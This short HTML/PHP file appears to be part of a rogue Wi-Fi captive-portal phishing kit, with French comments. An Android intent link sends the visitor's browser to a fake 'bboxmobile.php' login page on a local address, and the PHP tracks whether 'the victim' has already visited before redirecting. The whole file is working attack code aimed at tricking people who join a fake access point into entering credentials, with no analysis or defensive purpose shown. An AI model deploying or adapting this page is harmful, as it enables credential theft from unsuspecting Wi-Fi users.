<html>
<head>
</head>
<body>
<a 
  href="intent:http://175.0.0.1/bboxmobile.php#Intent;end" 
  target="_system">
  Cliquez pour ouvrir votre navigateur internet et vous identifier.
<?php
$filename = '/srv/http/msftconnecttest/vu.txt'; // changer ça pour debian et wifislax
if(file_exists($filename)){
 echo sprintf('',$filename);
 header( "refresh:1; url=bboxmobile.php" );
}else{
  $contents = 'La victime a déja visité cette page';           // Some simple example content.
  file_put_contents($filename, $contents);
}
?>
</body>
</html>